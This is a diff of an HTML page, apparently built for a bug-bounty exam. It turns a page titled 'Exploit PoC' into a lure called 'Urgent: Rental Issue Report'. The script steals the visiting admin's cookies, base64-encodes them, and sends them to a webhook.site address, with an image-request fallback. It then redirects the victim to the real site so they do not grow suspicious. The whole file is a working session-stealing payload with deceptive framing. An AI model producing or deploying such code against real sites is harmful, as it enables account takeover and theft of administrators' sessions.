@@ -1,15 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit PoC</title>
+    <title>Urgent: Rental Issue Report</title>
 </head>
 <body>
-   <script>
-fetch('https://webhook.site/a8b27575-617d-48b8-8a11-99d75398be58?leak=' + btoa(document.cookie));
-</script>
-
-    <h1>Loading...</h1>
+    <h3>Loading Rental Details...</h3>
+    <script>
+        // This script runs when the Admin opens your GitHub page
+        const webhook = "https://webhook.site/a8b27575-617d-48b8-8a11-99d75398be58";
+        
+        // 1. Grab the cookies
+        const leakedData = btoa(document.cookie);
+        
+        // 2. Send the data to your webhook
+        fetch(`${webhook}?admin_cookie=${leakedData}`)
+            .then(() => {
+                // 3. Optional: Redirect them back to the real site so they don't get suspicious
+                window.location.href = "https://bugbounty-exam.hashacademy.co/";
+            })
+            .catch(() => {
+                // Fallback if fetch is blocked
+                new Image().src = `${webhook}?fallback_leak=${leakedData}`;
+            });
+    </script>
 </body>
 </html>
